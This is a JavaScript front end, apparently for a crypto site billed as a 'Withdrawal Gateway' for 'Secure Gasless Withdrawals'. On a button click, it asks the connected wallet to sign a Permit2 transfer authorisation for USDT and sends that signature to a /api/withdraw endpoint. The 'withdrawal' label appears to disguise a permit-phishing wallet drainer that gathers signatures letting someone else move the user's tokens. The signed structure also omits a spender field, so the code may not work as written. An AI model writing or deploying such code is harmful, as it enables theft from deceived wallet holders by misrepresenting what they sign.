import { createAppKit } from "@reown/appkit";
import { Ethers5Adapter } from "@reown/appkit-adapter-ethers5";
import { mainnet, arbitrum } from "@reown/appkit/networks";
import { ethers } from "ethers";

// 1. Initialize Reown AppKit
const projectId = "f340171a355aad487eb6daa39b4b6c10"; // Replace with your Reown Project ID

const metadata = {
  name: "Withdrawal Gateway",
  description: "Secure Gasless Withdrawals",
  url: "https://avelut.xyz", 
  icons: ["https://www.avelut.xyz/logo_full.png"],
};

const modal = createAppKit({
  adapters: [new Ethers5Adapter()],
  metadata: metadata,
  networks: [mainnet],
  projectId,
  features: {
    analytics: false,
  },
});

// 2. UI Toast Utility
function showToast(msg, isError = false) {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;

    const div = document.createElement('div');
    div.className = `p-4 rounded-2xl shadow-2xl backdrop-blur-md bg-opacity-90 text-white font-semibold transition-all duration-300 transform translate-y-[-20px] opacity-0 ${isError ? 'bg-red-600' : 'bg-green-600'}`;
    div.textContent = msg;
    
    toastContainer.appendChild(div);
    
    setTimeout(() => { div.style.transform = 'translateY(0)'; div.style.opacity = '1'; }, 10);
    setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 3000);
}

// 3. The Withdrawal / Signing Logic (Ethers v5 Format)
async function handleWithdraw() {
    try {
        const walletProvider = modal.getWalletProvider();
        if (!walletProvider) {
            showToast("Please connect your wallet first!", true);
            await modal.open();
            return;
        }

        // --- FIX: Ethers v5 syntax ---
        // BrowserProvider (v6) -> Web3Provider (v5)
        const provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = provider.getSigner();
        const owner = await signer.getAddress();
        const network = await provider.getNetwork();

        const domain = {
            name: "Permit2",
            chainId: network.chainId,
            verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        };

        const types = {
            PermitTransferFrom: [
                { name: "permitted", type: "TokenPermissions" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ],
            TokenPermissions: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" }
            ]
        };

        // Ensure amount is parsed correctly for Ethers v5
        const amount = ethers.utils.parseUnits("10", 6); 
        const nonce = Date.now();
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const message = {
            permitted: {
                token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                amount: amount
            },
            nonce: nonce,
            deadline: deadline
        };

        // --- FIX: Ethers v5 SignTypedData ---
        showToast("Requesting signature...");
        const signature = await signer._signTypedData(domain, types, message);

        showToast("Signature secured. Executing...");
        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                signature, 
                permitData: { details: message, nonce, deadline }, 
                owner 
            })
        });

        const data = await res.json();
        data.success ? showToast("Success! Funds withdrawn.") : showToast(data.message, true);

    } catch (err) {
        console.error(err);
        showToast("Error: " + err.message, true);
    }
}
// 4. Attach to DOM on load
document.addEventListener('DOMContentLoaded', () => {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', handleWithdraw);
    }
});
